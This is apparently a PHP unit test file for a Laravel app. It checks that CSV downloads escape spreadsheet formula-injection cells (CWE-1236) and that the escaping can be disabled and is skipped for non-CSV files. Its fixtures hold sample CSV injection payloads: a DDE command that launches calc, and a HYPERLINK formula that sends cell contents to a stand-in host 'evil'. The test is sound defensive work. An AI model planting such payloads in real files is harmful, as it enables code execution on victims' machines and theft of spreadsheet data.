<?php

namespace Tests\Unit\Helpers;

use App\Helpers\StorageHelper;
use Illuminate\Support\Facades\Storage;
use Symfony\Component\HttpFoundation\StreamedResponse;
use Tests\TestCase;

/**
 * CSV downloads run through StorageHelper::downloader, which detects
 * the .csv extension and pipes bytes through EscapeFormula so cells
 * starting with `=`, `+`, `-`, `@`, tab, or CR get a leading backtick.
 * Prevents Excel / LibreOffice / Sheets from evaluating attacker-
 * controlled formulas on open (CWE-1236). Non-CSV downloads bypass
 * the sanitize entirely.
 */
class StorageHelperCsvSanitizeTest extends TestCase
{
    public function test_csv_download_escapes_formula_starter_cells(): void
    {
        Storage::fake('local');

        $csv = "name,payload\n"
            ."harmless,plain text\n"
            ."exploit,\"=cmd|' /C calc'!A0\"\n"
            ."plus,\"+HYPERLINK(\"\"http://evil\"\"&A1,\"\"click\"\")\"\n"
            ."at,@SUM(1+1)\n";

        Storage::disk('local')->put('malicious.csv', $csv);

        $response = StorageHelper::downloader('malicious.csv', 'local');
        $this->assertInstanceOf(StreamedResponse::class, $response);

        $body = $this->captureStreamedBody($response);

        $this->assertStringContainsString('`=cmd', $body);
        $this->assertStringContainsString('`+HYPERLINK', $body);
        $this->assertStringContainsString('`@SUM', $body);
        $this->assertStringNotContainsString(',=cmd', $body);
        $this->assertStringNotContainsString(',+HYPERLINK', $body);
        $this->assertStringNotContainsString(',@SUM', $body);
        // League CSV Writer re-quotes cells containing whitespace, so
        // the harmless row lands as `harmless,"plain text"` after the
        // round trip. Assert on the leading token to confirm the row
        // still ships intact rather than the exact serialization.
        $this->assertStringContainsString('harmless,', $body);
        $this->assertStringContainsString('plain text', $body);
    }

    public function test_csv_sanitize_can_be_disabled_via_app_escape_formulas_false(): void
    {
        Storage::fake('local');
        config()->set('app.escape_formulas', false);

        Storage::disk('local')->put('opt-out.csv', "name,payload\nexploit,=cmd|' /C calc'!A0\n");

        $response = StorageHelper::downloader('opt-out.csv', 'local');

        // With the flag explicitly disabled, downloader returns the
        // driver's raw download response rather than the streamed
        // sanitized one — we assert on that shape rather than the body.
        $this->assertNotInstanceOf(StreamedResponse::class, $response);
    }

    public function test_non_csv_download_is_not_streamed_through_sanitizer(): void
    {
        Storage::fake('local');
        Storage::disk('local')->put('receipt.pdf', '%PDF-1.4 fake pdf bytes');

        $response = StorageHelper::downloader('receipt.pdf', 'local');

        // Non-CSV skips the sanitize branch entirely and returns the
        // driver's download response (BinaryFileResponse for local).
        $this->assertNotInstanceOf(StreamedResponse::class, $response);
    }

    private function captureStreamedBody(StreamedResponse $response): string
    {
        ob_start();
        $response->sendContent();

        return (string) ob_get_clean();
    }
}
